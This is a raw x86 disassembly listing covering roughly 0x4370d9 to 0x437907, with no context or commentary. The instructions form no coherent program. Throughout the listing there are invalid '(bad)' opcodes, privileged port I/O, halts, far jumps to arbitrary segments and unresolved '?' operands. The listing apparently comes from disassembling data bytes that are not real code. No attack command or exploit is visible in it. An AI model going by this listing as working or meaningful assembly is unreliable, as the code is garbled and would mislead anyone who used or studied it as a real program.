  4370d9:	sub    BYTE PTR [ecx+0x2d73328c],ch
  4370df:	js     0x43714c
  4370e1:	fwait
  4370e2:	and    ebp,0x43
  4370e5:	xchg   ecx,eax
  4370e6:	aas    
  4370e7:	in     al,dx
  4370e8:	sbb    ecx,ebx
  4370ea:	xchg   ebx,eax
  4370eb:	or     edi,DWORD PTR ds:0x6f3187c8
  4370f1:	mov    ds:0xbe9626cb,eax
  4370f6:	in     al,dx
  4370f7:	dec    ecx
  4370f8:	and    eax,0xc3e47575
  4370fd:	mov    al,BYTE PTR [esi-0x231a2eaa]
  437103:	loopne 0x437138
  437105:	mov    ebp,0xde45eb53
  43710a:	sti    
  43710b:	cs dec esi
  43710d:	mov    ds:0xce5da75c,al
  437112:	mov    dl,0xe8
  437114:	xchg   edx,eax
  437115:	cmp    DWORD PTR [ebx-0x88d03af],eax
  43711b:	hlt    
  43711c:	nop
  43711d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43711e:	xlat   BYTE PTR ds:[ebx]
  43711f:	popa   
  437120:	addr16 int3 
  437122:	stos   DWORD PTR es:[edi],eax
  437123:	rol    DWORD PTR [edx],cl
  437125:	jne    0x4370e7
  437127:	mov    ss,WORD PTR [esi+0x23eaa2f8]
  43712d:	mov    ecx,0x3cbbf3f
  437132:	xchg   edx,eax
  437133:	out    0xe6,eax
  437135:	mov    ?,esp
  437137:	jg     0x43717f
  437139:	fnstsw WORD PTR [ebp-0x46b99794]
  43713f:	scas   al,BYTE PTR es:[edi]
  437140:	and    BYTE PTR [ecx],bl
  437142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437143:	jns    0x4370d2
  437145:	mov    dh,0x5f
  437147:	fist   WORD PTR [eax+0xa2ceba7]
  43714d:	push   es
  43714e:	dec    esp
  43714f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437150:	std    
  437151:	sbb    al,0x53
  437153:	or     eax,0x24e59b16
  437158:	in     al,dx
  437159:	and    al,0x94
  43715b:	rcr    ch,0x69
  43715e:	ins    DWORD PTR es:[edi],dx
  43715f:	(bad)  
  437160:	rcr    DWORD PTR [ecx-0x41a0fd05],cl
  437166:	out    dx,eax
  437167:	cs sbb ch,cl
  43716a:	inc    edx
  43716b:	pop    ds
  43716c:	jmp    0x7bd0:0x53f2df46
  437173:	rcr    DWORD PTR [edi+0x18c0a1c5],cl
  437179:	fmul   DWORD PTR [ebx]
  43717b:	mov    eax,0x71045924
  437180:	adc    DWORD PTR [eax-0x22],esp
  437183:	test   eax,0x611ba73b
  437188:	stos   BYTE PTR es:[edi],al
  437189:	jmp    DWORD PTR [ecx-0x1ea64869]
  43718f:	inc    edx
  437190:	mov    bl,0x2a
  437192:	mov    esp,0xee529954
  437197:	(bad)  
  437198:	and    eax,0xeaf15493
  43719d:	cmp    esp,DWORD PTR [ebx+ecx*1-0x382056dc]
  4371a4:	stos   DWORD PTR es:[edi],eax
  4371a5:	push   esp
  4371a6:	sti    
  4371a7:	adc    al,dl
  4371a9:	xchg   BYTE PTR [edi+edx*2],ch
  4371ac:	add    BYTE PTR [ebp-0x4b],al
  4371af:	xchg   ebp,eax
  4371b0:	aaa    
  4371b1:	arpl   WORD PTR [ecx-0x62c4fcca],di
  4371b7:	push   ss
  4371b8:	pop    ds
  4371b9:	mov    cl,0xa3
  4371bb:	aad    0x72
  4371bd:	bound  ecx,QWORD PTR [edx-0x397bda3c]
  4371c3:	jmp    0x1d0d:0x129534f3
  4371ca:	sbb    BYTE PTR [eax],dl
  4371cc:	sbb    eax,0x75d6f889
  4371d1:	and    bh,BYTE PTR [edi-0x64527831]
  4371d7:	sbb    ecx,esi
  4371d9:	je     0x437258
  4371db:	out    0xff,eax
  4371dd:	call   0xbcec:0x754c4fef
  4371e4:	dec    esi
  4371e5:	in     al,dx
  4371e6:	lods   al,BYTE PTR ds:[esi]
  4371e7:	push   ss
  4371e8:	inc    esp
  4371e9:	inc    esp
  4371ea:	mov    eax,0x3ba8e3d8
  4371ef:	cli    
  4371f0:	addr16 or eax,0xa1b5653e
  4371f6:	add    eax,0xaeed6437
  4371fb:	div    cl
  4371fd:	pop    es
  4371fe:	sub    BYTE PTR [ecx+0x55b8a346],cl
  437204:	cmc    
  437205:	jbe    0x4371fb
  437207:	icebp  
  437208:	and    BYTE PTR [ebp-0x56e908e7],bh
  43720e:	enter  0x3144,0xa2
  437212:	push   eax
  437213:	cmc    
  437214:	or     eax,0xb5ac0ba5
  437219:	fwait
  43721a:	aam    0x97
  43721c:	mov    bl,0xe4
  43721e:	arpl   WORD PTR [edx],cx
  437220:	add    DWORD PTR [ebp+0x27],ecx
  437223:	mov    ch,0x1c
  437225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437226:	pop    ecx
  437227:	dec    eax
  437228:	lods   eax,DWORD PTR ds:[esi]
  437229:	pushf  
  43722a:	retf   
  43722b:	iret   
  43722c:	arpl   WORD PTR ds:0x6b489e31,ax
  437232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437233:	pop    es
  437234:	push   cs
  437235:	out    dx,al
  437236:	lds    esp,FWORD PTR [eax+ecx*4+0x2d2971a7]
  43723d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43723e:	cmp    esi,DWORD PTR [ecx+0x3bddae78]
  437244:	add    ah,BYTE PTR [ebp-0x29]
  437247:	adc    eax,0x968fdff2
  43724c:	adc    DWORD PTR [ebx],eax
  43724e:	stc    
  43724f:	mov    WORD PTR [eax],fs
  437251:	ret    
  437252:	mov    edi,0x6f87a550
  437257:	out    dx,al
  437258:	jmp    0xaf66f082
  43725d:	sub    ecx,ecx
  43725f:	mov    WORD PTR [edi-0x62],?
  437262:	fwait
  437263:	stos   DWORD PTR es:[edi],eax
  437264:	sbb    bh,cl
  437266:	(bad)  [ebx]
  437268:	mov    ebp,0x202fe021
  43726d:	mov    edi,esi
  43726f:	cmp    bh,BYTE PTR [ecx+0x1d692765]
  437275:	jns    0x43728a
  437277:	sub    eax,0x7d4b4836
  43727c:	jne    0x43721b
  43727e:	sub    edx,eax
  437280:	adc    eax,0x12674874
  437285:	iret   
  437286:	pusha  
  437287:	adc    dh,BYTE PTR [edx+0x4a84bd40]
  43728d:	xchg   ebx,eax
  43728e:	test   DWORD PTR [ebx-0x19e20b0b],esi
  437294:	push   ds
  437295:	cwde   
  437296:	jmp    0x437275
  437298:	cmp    eax,0xbc6e7b39
  43729d:	mov    ah,0x6c
  43729f:	lods   al,BYTE PTR ds:[esi]
  4372a0:	rcl    DWORD PTR [ecx+0x2],cl
  4372a3:	jmp    0x43729a
  4372a5:	or     BYTE PTR ds:0xd9cbb8f2,ah
  4372ab:	jbe    0x4372ce
  4372ad:	jns    0x4372af
  4372af:	fisubr WORD PTR [ebp+0x20]
  4372b2:	xor    BYTE PTR [esi+0x1d4b993d],ah
  4372b8:	out    0x29,al
  4372ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4372bb:	dec    edi
  4372bc:	outs   dx,DWORD PTR ds:[esi]
  4372be:	cmc    
  4372bf:	pop    ecx
  4372c0:	cmp    eax,0x5cd4be8d
  4372c5:	stos   BYTE PTR es:[edi],al
  4372c6:	pop    eax
  4372c7:	and    DWORD PTR [ebp-0x5e],eax
  4372ca:	cmp    edi,edi
  4372cc:	xchg   ecx,eax
  4372cd:	shr    BYTE PTR [edi-0x66a69cec],cl
  4372d3:	outs   dx,DWORD PTR ds:[esi]
  4372d4:	push   ds
  4372d5:	dec    ecx
  4372d6:	and    eax,0x20fe4cdc
  4372db:	mov    al,ds:0x2c5babf2
  4372e0:	iret   
  4372e1:	icebp  
  4372e2:	adc    al,0xad
  4372e4:	and    ebx,DWORD PTR [edx]
  4372e6:	dec    eax
  4372e7:	xor    eax,0x28329923
  4372ec:	repz mov esi,0x9d009405
  4372f2:	pop    ebx
  4372f3:	sbb    DWORD PTR [edx],ecx
  4372f5:	sbb    eax,0xf7e9081a
  4372fa:	daa    
  4372fb:	punpcklwd mm6,DWORD PTR [ebp-0x5c]
  4372ff:	(bad)  
  437300:	and    eax,DWORD PTR [ecx-0x5e]
  437303:	(bad)  
  437304:	enter  0x7343,0xaf
  437308:	xchg   esi,eax
  437309:	jb     0x4372e1
  43730b:	(bad)  
  43730c:	and    al,0xd1
  43730e:	pop    edx
  43730f:	out    0xd,al
  437311:	leave  
  437312:	ret    
  437313:	imul   cx,si,0xffbb
  437317:	aam    0x2f
  437319:	mov    eax,0x58c537b1
  43731e:	jge    0x437312
  437320:	inc    ebp
  437321:	mov    ebx,DWORD PTR gs:[esi+0x19]
  437325:	test   eax,0xfd6af9f9
  43732a:	push   cs
  43732b:	and    al,ah
  43732d:	mov    ebp,0x7b101b7b
  437332:	imul   edx,esp,0x75
  437335:	adc    DWORD PTR [edi-0x7f2df242],edx
  43733b:	out    0x8f,eax
  43733d:	imul   edx,DWORD PTR [ebx+0x5d86ccf9],0xc20dd9cc
  437347:	in     eax,0xd0
  437349:	mov    eax,ds:0x6553237b
  43734e:	and    eax,0xc3fc75c3
  437353:	xor    edx,edi
  437355:	xor    eax,DWORD PTR [edi-0x4ee1974a]
  43735b:	enter  0x9f1a,0x7b
  43735f:	mov    al,0xdf
  437361:	pop    edx
  437362:	popa   
  437363:	call   0x54e:0x62351a05
  43736a:	mov    al,0xd4
  43736c:	adc    bh,dh
  43736e:	push   ebx
  43736f:	(bad)  
  437370:	(bad)  
  437371:	add    dl,al
  437373:	popa   
  437374:	inc    esi
  437375:	pushf  
  437376:	loopne 0x437390
  437378:	(bad)  
  437379:	test   al,0xfe
  43737b:	xor    al,ah
  43737d:	xchg   BYTE PTR gs:[eax+0x1a],bl
  437381:	dec    ecx
  437382:	and    ah,BYTE PTR [ecx*8-0x7642b4d3]
  437389:	mov    al,ds:0xa35d69ca
  43738e:	sti    
  43738f:	sub    DWORD PTR [ecx-0x34],0x33
  437393:	test   eax,0xaf9154b5
  437398:	cdq    
  437399:	mov    ah,0x9b
  43739b:	(bad)  
  43739c:	mov    al,ds:0xce94b327
  4373a1:	and    BYTE PTR [edi-0x9],dl
  4373a4:	add    eax,0x7aed2b84
  4373a9:	sub    ecx,DWORD PTR [edx+0x4260674c]
  4373af:	xchg   esp,eax
  4373b0:	je     0x4373b1
  4373b2:	mov    ch,0x14
  4373b4:	(bad)  
  4373b5:	sbb    al,BYTE PTR [ecx-0x2c37d745]
  4373bb:	daa    
  4373bc:	add    eax,0xa7ea9825
  4373c1:	std    
  4373c2:	pushf  
  4373c3:	int3   
  4373c4:	bound  edx,QWORD PTR [eax]
  4373c6:	into   
  4373c7:	(bad)  
  4373c8:	in     al,0xc1
  4373ca:	mov    WORD PTR [edi+0x71],cs
  4373cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4373ce:	cmp    esp,DWORD PTR [edx+0x28]
  4373d1:	aam    0x8b
  4373d3:	pop    es
  4373d4:	jge    0x4373e0
  4373d6:	sbb    DWORD PTR [ecx+edi*4],0xf93ab879
  4373dd:	sahf   
  4373de:	or     ebp,DWORD PTR [ebx-0x61]
  4373e1:	dec    edx
  4373e2:	daa    
  4373e3:	out    dx,eax
  4373e4:	inc    ebp
  4373e5:	adc    eax,0x9c86fe2a
  4373ea:	mov    bh,0x4
  4373ec:	not    DWORD PTR ds:0x644da283
  4373f2:	loope  0x4373c0
  4373f4:	inc    edi
  4373f5:	stc    
  4373f6:	pop    eax
  4373f7:	or     cl,dh
  4373f9:	dec    esp
  4373fa:	jo     0x4373dc
  4373fc:	sbb    al,0xa0
  4373fe:	ret    0xa6ae
  437401:	lock out dx,eax
  437403:	adc    eax,0x64bd9498
  437408:	gs in  al,dx
  43740a:	dec    eax
  43740b:	push   0xffffffd5
  43740d:	sti    
  43740e:	int3   
  43740f:	in     al,0xa3
  437411:	sbb    al,0x26
  437413:	js     0x4373a0
  437415:	pop    ecx
  437416:	(bad)  
  437418:	pop    ecx
  437419:	add    al,0x3f
  43741b:	xchg   edx,eax
  43741c:	xchg   ebx,eax
  43741d:	adc    DWORD PTR [ebp+0x1d330839],edi
  437423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437424:	push   esi
  437425:	mov    ebp,0x1d0d3bab
  43742a:	add    eax,0xf027f7e9
  43742f:	test   eax,0x14bf4f76
  437434:	dec    ecx
  437435:	outs   dx,DWORD PTR ds:[esi]
  437436:	push   0xf5a33567
  43743b:	cli    
  43743c:	adc    al,0x62
  43743e:	out    dx,eax
  43743f:	pop    esp
  437440:	cmp    dh,BYTE PTR [edx]
  437442:	pop    ecx
  437443:	push   ss
  437444:	add    al,0x99
  437446:	xor    bh,BYTE PTR [esi]
  437448:	cmp    bl,BYTE PTR [edi+0x30ff54bf]
  43744e:	jl     0x4374c0
  437450:	test   eax,esp
  437452:	mov    ds:0x52f045ec,al
  437457:	fsubrp st(0),st
  437459:	pushf  
  43745a:	dec    esi
  43745b:	mov    DWORD PTR [ebp+0x76],0x15d2ecba
  437462:	and    esi,ecx
  437464:	cmc    
  437465:	outs   dx,DWORD PTR ds:[esi]
  437466:	ins    DWORD PTR es:[edi],dx
  437467:	out    0xf5,al
  437469:	pop    ds
  43746a:	pop    ecx
  43746b:	mov    al,ds:0x48395916
  437470:	je     0x4374ee
  437472:	call   0xd:0x9ba72785
  437479:	push   esp
  43747a:	push   esp
  43747b:	gs xor al,0x8f
  43747e:	aaa    
  43747f:	hlt    
  437480:	loopne 0x43741c
  437482:	call   DWORD PTR [edx+0x16e17941]
  437488:	or     al,0xc8
  43748a:	sub    DWORD PTR [ecx],ebx
  43748c:	and    DWORD PTR [edx+edx*4-0x250b9a11],ebx
  437493:	jmp    0xf289b3
  437498:	sbb    eax,0xb2ec4039
  43749d:	dec    ecx
  43749e:	imul   edi,DWORD PTR [edi-0x3a],0xd0070b9b
  4374a5:	mov    ecx,0x733f272e
  4374aa:	pop    ds
  4374ab:	jb     0x4374b1
  4374ad:	ret    
  4374ae:	mov    dh,0x64
  4374b0:	ins    DWORD PTR es:[edi],dx
  4374b1:	sahf   
  4374b2:	push   edx
  4374b3:	pop    eax
  4374b4:	mov    DWORD PTR [ebp+0x44],eax
  4374b7:	cdq    
  4374b8:	mov    al,0x9c
  4374ba:	mov    edx,0xa2327d6c
  4374bf:	mov    DWORD PTR [ebx+0x67b68add],0x9874bdf4
  4374c9:	test   BYTE PTR [esi],bl
  4374cb:	sti    
  4374cc:	mov    dl,0xad
  4374ce:	pop    ebx
  4374cf:	sub    edi,0x444c021b
  4374d5:	imul   esp,DWORD PTR [edx+0x291cc7b1],0xffffffd6
  4374dc:	int3   
  4374dd:	sti    
  4374de:	mov    ch,0x54
  4374e0:	call   0x7f19b081
  4374e5:	fisubr WORD PTR [ecx-0x39bd0280]
  4374eb:	fcom   QWORD PTR [ebp-0x67]
  4374ee:	loop   0x4374f5
  4374f0:	dec    esi
  4374f1:	cwde   
  4374f2:	(bad)  
  4374f3:	aam    0x19
  4374f5:	mov    eax,0xc86bf48
  4374fa:	jge    0x437559
  4374fc:	or     ah,BYTE PTR [ebp-0x19ad71fb]
  437502:	add    al,0x9
  437504:	pop    ebp
  437505:	sbb    al,0xa
  437507:	add    eax,0x94ff8118
  43750c:	clc    
  43750d:	mov    bl,BYTE PTR [edi+eax*1]
  437510:	xchg   BYTE PTR [edi-0x2a],ah
  437513:	hlt    
  437514:	cmp    dh,bh
  437516:	mov    bl,0xbe
  437518:	sub    al,0xd9
  43751a:	inc    edx
  43751b:	xchg   edx,eax
  43751c:	cli    
  43751d:	(bad)  
  43751e:	mov    eax,0x9aeb1ed1
  437523:	mov    esp,0xbda17b69
  437528:	call   0xd48307b
  43752d:	cmp    al,0xcc
  43752f:	ja     0x4374bd
  437531:	xor    eax,0x4a07e4bd
  437536:	leave  
  437537:	mov    ch,0x95
  437539:	mov    ds:0x93b9f0b0,al
  43753e:	sub    eax,0xa4a063fb
  437543:	inc    edi
  437544:	pop    es
  437545:	push   0x18
  437547:	push   esp
  437548:	aaa    
  437549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43754a:	adc    edi,DWORD PTR [edi+0x18]
  43754d:	jmp    0x4374f7
  43754f:	repnz std 
  437551:	mov    al,ds:0x190f14db
  437556:	ja     0x437517
  437558:	out    dx,al
  437559:	imul   edi,esi,0xb4b63a41
  43755f:	aam    0x52
  437561:	mov    bh,0xec
  437563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437564:	xchg   esi,eax
  437565:	fadd   QWORD PTR [esi-0x5c5aa3cc]
  43756b:	adc    eax,0xb252eb1f
  437570:	(bad)  
  437571:	fwait
  437572:	outs   dx,DWORD PTR ds:[esi]
  437573:	and    eax,0xee033add
  437578:	cmc    
  437579:	mov    al,ds:0x91fe0bcb
  43757e:	cs in  al,dx
  437580:	fs into 
  437582:	dec    esp
  437583:	push   edx
  437584:	pushf  
  437585:	fdiv   QWORD PTR [ebp-0x846916c]
  43758b:	pop    es
  43758c:	aad    0x7b
  43758e:	sbb    ch,cl
  437590:	test   dh,ah
  437592:	pop    ebp
  437593:	mov    ecx,0x2248792f
  437598:	lods   al,BYTE PTR ds:[esi]
  437599:	push   edi
  43759a:	push   esp
  43759b:	stos   BYTE PTR es:[edi],al
  43759c:	pop    edi
  43759d:	cmp    BYTE PTR [ebx],bl
  43759f:	or     dh,BYTE PTR [esi-0x8]
  4375a2:	add    bl,BYTE PTR [esi+0x7]
  4375a5:	retf   
  4375a6:	repnz dec edx
  4375a8:	popf   
  4375a9:	test   BYTE PTR [ecx+0x12998dcd],bl
  4375af:	or     al,0xbc
  4375b1:	mov    WORD PTR [edi-0x3bc9fb52],ds
  4375b7:	add    BYTE PTR [ebp-0x5d],dl
  4375ba:	cmp    esi,DWORD PTR [edx-0x946fc21]
  4375c0:	lock push edx
  4375c2:	stos   BYTE PTR es:[edi],al
  4375c3:	out    0x8f,eax
  4375c5:	loopne 0x437581
  4375c7:	frstor [ebx-0x4c297e27]
  4375cd:	test   BYTE PTR [esi],cl
  4375cf:	popf   
  4375d0:	pop    edx
  4375d1:	scas   al,BYTE PTR es:[edi]
  4375d2:	mov    bh,0xac
  4375d4:	inc    ebp
  4375d5:	jecxz  0x43755f
  4375d7:	repz int3 
  4375d9:	dec    ebx
  4375da:	jg     0x437646
  4375dc:	ret    0x41bc
  4375df:	jmp    0xebd312e9
  4375e4:	es leave 
  4375e6:	retf   0xc41c
  4375e9:	mov    al,ds:0x4c1e11db
  4375ee:	nop
  4375ef:	sbb    DWORD PTR [edi+0x44d41c8a],ecx
  4375f5:	les    ebx,FWORD PTR [edx-0x552a8fb]
  4375fb:	jmp    0xbdfe:0xb48bbf93
  437602:	jb     0x437653
  437604:	push   esp
  437605:	in     eax,dx
  437606:	jmp    0x4375d6
  437608:	sbb    eax,0x849eba34
  43760d:	cdq    
  43760e:	stos   DWORD PTR es:[edi],eax
  43760f:	test   al,0x11
  437611:	cmp    bl,BYTE PTR [ebx+0x2ba44f67]
  437617:	mov    esi,0x965fa66a
  43761c:	mov    ebp,ebp
  43761e:	and    ch,al
  437620:	xchg   esp,eax
  437621:	fwait
  437622:	cmp    ecx,edx
  437624:	sbb    edx,esp
  437626:	leave  
  437627:	test   eax,0xf47ba3d4
  43762c:	push   ecx
  43762d:	fld    st(7)
  43762f:	(bad)  
  437630:	dec    ebp
  437631:	push   eax
  437632:	imul   edi,DWORD PTR [eax],0xffffff97
  437635:	add    al,0xbe
  437637:	aam    0x77
  437639:	out    0x8,al
  43763b:	add    DWORD PTR [ecx+0x6bcb4146],ebx
  437641:	and    al,0xca
  437643:	mov    esp,0xe4eda6c9
  437648:	mov    ah,0x9c
  43764a:	popf   
  43764b:	stos   BYTE PTR es:[edi],al
  43764c:	jge    0x4376bd
  43764e:	inc    edi
  43764f:	out    0x2e,al
  437651:	jmp    0x99a8023f
  437656:	mov    ebx,0x5c70ad4d
  43765b:	add    al,0xb7
  43765d:	jecxz  0x4375fd
  43765f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437660:	push   ss
  437661:	cs out 0x54,eax
  437664:	push   ecx
  437665:	daa    
  437666:	or     DWORD PTR [edi],edx
  437668:	ss lock rcr ch,cl
  43766c:	cmp    esp,DWORD PTR ds:0x28dfed9d
  437672:	pop    ebx
  437673:	imul   ebx,ebx,0xffffff9e
  437676:	bound  esp,QWORD PTR ds:0xebe77385
  43767c:	push   esi
  43767d:	daa    
  43767e:	cs jle 0x4376d1
  437681:	mov    ds:0x6b40724b,al
  437686:	cs lahf 
  437688:	jl     0x43761d
  43768a:	mov    bl,0xbc
  43768c:	fidiv  WORD PTR [edi-0x596a0b30]
  437692:	pop    ss
  437693:	cmp    bl,BYTE PTR [ebx-0x61]
  437696:	retf   
  437697:	inc    ebx
  437698:	in     al,dx
  437699:	jp     0x43765c
  43769b:	or     esi,DWORD PTR [ecx]
  43769d:	mov    ebp,0x1d20aa4d
  4376a2:	jecxz  0x437678
  4376a4:	sub    al,0xa2
  4376a6:	idiv   BYTE PTR [esi-0x1bd4644c]
  4376ac:	xor    edi,DWORD PTR [eax+0x40]
  4376af:	mov    fs,WORD PTR [esi]
  4376b1:	xchg   edi,eax
  4376b2:	sub    al,0x23
  4376b4:	mov    bl,0xd4
  4376b6:	mov    esi,0x42b25324
  4376bb:	dec    edx
  4376bc:	cmc    
  4376bd:	(bad)  
  4376bf:	in     al,dx
  4376c0:	push   ds
  4376c1:	jp     0x4376a7
  4376c3:	xchg   ebx,eax
  4376c4:	push   esp
  4376c5:	sub    DWORD PTR [eax-0x25ef0021],ebp
  4376cb:	and    eax,0x97e61980
  4376d0:	lea    eax,[esi+0x6b7541bc]
  4376d6:	lods   eax,DWORD PTR ds:[esi]
  4376d7:	inc    edx
  4376d8:	jmp    DWORD PTR [ecx]
  4376da:	mov    bh,0xca
  4376dc:	and    eax,0xdd2348f9
  4376e1:	aaa    
  4376e2:	inc    edx
  4376e3:	mov    dl,dl
  4376e5:	cdq    
  4376e6:	or     esi,DWORD PTR ds:0x954e7460
  4376ec:	xor    al,0x9a
  4376ee:	les    ecx,FWORD PTR [edi*8+0x631c1168]
  4376f5:	div    DWORD PTR [edx+0x644a0794]
  4376fb:	mul    DWORD PTR [ebp+0x42f29248]
  437701:	dec    ecx
  437702:	push   ebp
  437703:	cmp    bh,BYTE PTR [ebp-0x7]
  437706:	nop
  437707:	fdiv   st(4),st
  437709:	in     al,dx
  43770a:	xor    eax,0xb4a2453a
  43770f:	ins    BYTE PTR es:[edi],dx
  437710:	jne    0x4376c9
  437712:	jp     0x437701
  437714:	inc    eax
  437715:	ja     0x4376fe
  437717:	push   ss
  437718:	mov    bh,0xb0
  43771a:	or     al,0x85
  43771c:	sbb    al,0x9e
  43771e:	cmp    ebp,DWORD PTR [ecx]
  437720:	push   ss
  437721:	sub    al,0xed
  437723:	or     eax,0xf2bedfc
  437728:	and    eax,0xb113b053
  43772d:	add    eax,DWORD PTR [eax-0x15]
  437730:	xchg   ecx,eax
  437731:	or     DWORD PTR [ebx-0x7f011c30],eax
  437737:	aad    0xff
  437739:	mov    bl,0xa4
  43773b:	out    dx,al
  43773c:	mov    WORD PTR [ebx+edi*4+0x4e003bdf],fs
  437743:	(bad)  
  437744:	jb     0x4376e1
  437746:	xchg   ebp,eax
  437747:	pusha  
  437748:	fldenv [esi-0x5d7267cd]
  43774e:	test   al,0x36
  437750:	(bad)  
  437751:	cdq    
  437752:	dec    ebx
  437753:	pop    es
  437754:	xchg   edx,eax
  437755:	mov    ebp,0x8010bd20
  43775a:	(bad)  
  43775b:	sbb    ah,BYTE PTR [edx]
  43775d:	retf   0x84b9
  437760:	sbb    DWORD PTR ds:0x98551c51,esp
  437766:	jg     0x43775b
  437768:	imul   edi,DWORD PTR [ebp-0x1e],0x7a
  43776c:	fwait
  43776d:	adc    bl,BYTE PTR [eax-0x21]
  437770:	pop    ss
  437771:	jecxz  0x43772e
  437773:	xchg   esp,eax
  437774:	pop    edi
  437775:	and    al,0x1b
  437777:	push   eax
  437778:	adc    eax,0x751f4529
  43777d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43777e:	mov    eax,DWORD PTR [ebp+0x68f8c2b9]
  437784:	mov    al,ds:0x996f7746
  437789:	xor    DWORD PTR [ecx-0x645101fc],esi
  43778f:	inc    esi
  437790:	(bad)  
  437791:	mov    dl,0x24
  437793:	and    dl,ch
  437795:	ret    0x2398
  437798:	leave  
  437799:	shl    BYTE PTR [ebx-0x4d19d8d1],1
  43779f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4377a0:	loopne 0x4377a7
  4377a2:	loopne 0x437799
  4377a4:	cmc    
  4377a5:	push   ds
  4377a6:	jae    0x437790
  4377a8:	test   al,0x61
  4377aa:	icebp  
  4377ab:	and    DWORD PTR [ebx],esp
  4377ad:	jmp    0xa5146403
  4377b2:	sub    eax,0x9f352fe5
  4377b7:	pop    ds
  4377b8:	and    al,0xe1
  4377ba:	sub    DWORD PTR [ecx+0x50eddfbb],ebp
  4377c0:	push   ss
  4377c1:	cdq    
  4377c2:	mov    ds:0x17f53984,al
  4377c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4377c8:	sub    eax,0x870c9d7d
  4377cd:	sbb    al,0x2b
  4377cf:	lock (bad) 
  4377d1:	fisubr DWORD PTR [eax]
  4377d3:	sbb    al,0x95
  4377d5:	fldcw  WORD PTR [esi]
  4377d7:	mov    ebp,0xe33fcc7c
  4377dc:	not    BYTE PTR [edx]
  4377de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4377df:	aad    0xf1
  4377e1:	sbb    DWORD PTR [eax-0x2ed7b017],ebx
  4377e7:	dec    ecx
  4377e8:	cmc    
  4377e9:	jmp    0xfb92:0x1bb980b3
  4377f0:	xor    DWORD PTR [ebx-0x48],esp
  4377f3:	jne    0x437815
  4377f5:	sbb    DWORD PTR [ebp+0x1aca8a1d],ecx
  4377fb:	and    DWORD PTR [edi],ecx
  4377fd:	mov    ds:0xaac12fdb,al
  437802:	test   DWORD PTR [edi+0x73d1c80d],0x64bae7d2
  43780c:	mov    al,0xa1
  43780e:	mov    eax,0xd74ca667
  437813:	loope  0x43782e
  437815:	(bad)  
  437816:	jg     0x43787b
  437818:	sbb    esi,DWORD PTR [ebx-0x74928123]
  43781e:	mov    bl,0x44
  437820:	lahf   
  437821:	dec    ebx
  437822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437823:	adc    eax,0xcd36c297
  437828:	mov    ecx,0x72e784e0
  43782d:	call   0xfa7edcae
  437832:	pop    ecx
  437833:	cmp    al,0x51
  437835:	xchg   ecx,eax
  437836:	dec    eax
  437837:	mov    ecx,DWORD PTR [edi]
  437839:	jns    0x4377f2
  43783b:	jmp    0x4377f4
  43783d:	push   ss
  43783e:	add    dl,dl
  437840:	pop    edx
  437841:	and    al,0x5e
  437843:	jnp    0x437876
  437845:	sbb    DWORD PTR [edx-0x75a4b57b],esp
  43784b:	xor    eax,0x28a05953
  437850:	mov    cl,0x8b
  437852:	mov    esp,0x4bbd1de3
  437857:	out    dx,al
  437858:	and    eax,0x31e55773
  43785d:	xor    eax,0x12a3cc3c
  437862:	std    
  437863:	inc    edi
  437864:	inc    esi
  437865:	mov    edi,0x2140e4bd
  43786a:	out    dx,al
  43786b:	out    dx,eax
  43786c:	sbb    eax,0x70ce3ba3
  437871:	js     0x437847
  437873:	aaa    
  437874:	mov    ch,0x7f
  437876:	cmp    eax,0xb1d1de63
  43787b:	fs mov dl,0x62
  43787e:	lds    edi,FWORD PTR [esi+edx*2]
  437881:	xor    BYTE PTR [ebx],bl
  437883:	leave  
  437884:	dec    eax
  437885:	or     DWORD PTR [ebx],ebp
  437887:	ds push ds
  437889:	mov    eax,ds:0x9d5d801
  43788e:	mov    DWORD PTR [ebx+edi*8+0x7e885ba7],esi
  437895:	lahf   
  437896:	jmp    0xd2639e26
  43789b:	in     eax,dx
  43789c:	dec    edi
  43789d:	imul   esp,esi,0xffd91960
  4378a3:	dec    esi
  4378a4:	pop    ss
  4378a5:	out    dx,eax
  4378a6:	add    DWORD PTR [ebx+0x66],eax
  4378a9:	add    cl,BYTE PTR [edx+edi*8]
  4378ac:	(bad)  
  4378ad:	pushf  
  4378ae:	and    dl,BYTE PTR [ebp+0x6fdcf92b]
  4378b4:	mov    dh,BYTE PTR [esi+eiz*8-0x6f]
  4378b8:	fst    QWORD PTR [esi-0x70a1f8e]
  4378be:	jnp    0x43786c
  4378c0:	mov    edx,0x2159b038
  4378c5:	inc    ebp
  4378c6:	lahf   
  4378c7:	xlat   BYTE PTR ds:[ebx]
  4378c8:	repnz mov ds:0x95d6ccdb,eax
  4378ce:	push   eax
  4378cf:	stos   BYTE PTR es:[edi],al
  4378d0:	cmp    DWORD PTR [eax+edx*4+0x33],ebp
  4378d4:	test   edi,eax
  4378d6:	shl    DWORD PTR [edi+ecx*8+0x34],0x76
  4378db:	dec    esp
  4378dc:	xor    ah,BYTE PTR [ebp-0x6d7ddc5]
  4378e2:	mov    ds:0xeab6c92b,al
  4378e7:	pop    edi
  4378e8:	jno    0x43793a
  4378ea:	mov    esp,0x248fe6b4
  4378ef:	icebp  
  4378f0:	ins    DWORD PTR es:[edi],dx
  4378f1:	xchg   edi,eax
  4378f2:	sbb    al,0x47
  4378f4:	scas   eax,DWORD PTR es:[edi]
  4378f5:	imul   ebx,ebx,0xb904993e
  4378fb:	xchg   BYTE PTR [ecx+0x39],cl
  4378fe:	pusha  
  4378ff:	adc    al,0x96
  437901:	jne    0x4378e2
  437903:	rol    al,cl
  437905:	jb     0x4378c1
  437907:	jb     0x43795e
